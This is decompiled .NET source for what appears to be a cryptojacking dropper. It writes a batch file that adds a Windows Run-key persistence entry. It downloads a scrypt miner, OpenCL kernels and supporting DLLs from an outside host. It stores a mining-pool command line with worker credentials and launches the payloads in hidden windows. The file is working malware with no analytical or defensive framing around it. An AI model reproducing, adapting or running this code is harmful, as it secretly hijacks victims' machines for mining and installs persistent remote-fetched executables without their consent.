using System;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[StandardModule]
internal sealed class Main
{
	[STAThread]
	public static void Main()
	{
		string text = "no";
		string text2 = "http://blabla.com/file.pdf";
		string text3 = "file.pdf";
		string text4 = "stratum.triplemining.com:3334";
		string text5 = "douglas12107_myguests17";
		string text6 = "what459sit512";
		string text7 = "yes";
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\mm.bat";
		FileStream fileStream = null;
		if (!File.Exists(path))
		{
			fileStream = File.Create(path);
			using (fileStream)
			{
			}
		}
		if (File.Exists(path))
		{
			using StreamWriter streamWriter = new StreamWriter(path);
			string value = "@echo off";
			string value2 = "cd " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string value3 = "%windir%\\system32\\reg.exe add HKCU\\software\\microsoft\\windows\\currentversion\\run /v win /d \"\\\"%appdata%\\win.exe\"\" /f";
			string value4 = "start \"\" \"" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text3 + "\"";
			string value5 = "exit";
			streamWriter.WriteLine(value);
			streamWriter.WriteLine(value2);
			if (Operators.CompareString(text7, "yes", false) == 0)
			{
				streamWriter.WriteLine(value3);
			}
			if (Operators.CompareString(text, "yes", false) == 0)
			{
				streamWriter.WriteLine(value4);
			}
			streamWriter.WriteLine(value5);
		}
		string path2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\libcurl.txt";
		FileStream fileStream3 = null;
		if (!File.Exists(path2))
		{
			fileStream3 = File.Create(path2);
			using (fileStream3)
			{
			}
		}
		if (File.Exists(path2))
		{
			using StreamWriter streamWriter2 = new StreamWriter(path2);
			string value6 = "\\scuist.exe --scrypt -o stratum+" + text4 + " -u " + text5 + " -p " + text6;
			streamWriter2.Write(value6);
		}
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/scuist.exe", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\scuist.exe");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/diablo130302.cl", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\diablo130302.cl");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/win.exe", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\win.exe");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/diakgcn121016.cl", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\diakgcn121016.cl");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/libcurl.dll", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\libcurl.dll");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/libcurl-4.dll", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\libcurl-4.dll");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/libeay32.dll", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\libeay32.dll");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/libidn-11.dll", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\libidn-11.dll");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/libpdcurses.dll", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\libpdcurses.dll");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/librtmp.dll", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\librtmp.dll");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/libssh2.dll", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\libssh2.dll");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/OpenCL.dll", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\OpenCL.dll");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/phatk121016.cl", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\phatk121016.cl");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/poclbm130302.cl", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\poclbm130302.cl");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/pthreadGC2.dll", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pthreadGC2.dll");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/scrypt130511.cl", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\scrypt130511.cl");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/scrypt130511_original.cl", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\scrypt130511_original.cl");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/ssleay32.dll", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ssleay32.dll");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/zlib1.dll", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\zlib1.dll");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/settings.txt", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\settings.txt");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/oldsettings.txt", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\oldsettings.txt");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://mobileappcheaters.com/seroigndfn/scrypt130511Intel(R) HD Graphics 4000glg2tc3392w256l4.bin", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\scrypt130511Intel(R) HD Graphics 4000glg2tc3392w256l4.bin");
		if (Operators.CompareString(text, "yes", false) == 0)
		{
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile(text2, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text3);
		}
		Interaction.Shell(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\mm.bat", (AppWinStyle)2, false, -1);
		Interaction.Shell(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\win.exe", (AppWinStyle)2, false, -1);
	}
}
